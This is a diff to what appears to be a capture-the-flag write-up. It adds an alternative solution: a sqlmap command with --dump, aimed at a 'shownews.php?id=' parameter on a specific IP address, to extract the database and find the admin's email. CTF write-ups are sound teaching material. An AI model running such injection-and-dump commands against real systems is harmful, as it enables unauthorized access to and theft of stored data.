@@ -60,4 +60,11 @@ we need to get email of admin so let's use :
 
 email is the flag 
 
+
+can also use sqlmap :
+
+` sqlmap -u "18.192.3.151/whoisadmin/shownews.php?id=3 " --dump   `
+
+![image](https://user-images.githubusercontent.com/67979878/130712605-e75c5b87-660b-4407-a255-54097c031deb.png)
+
 # done 
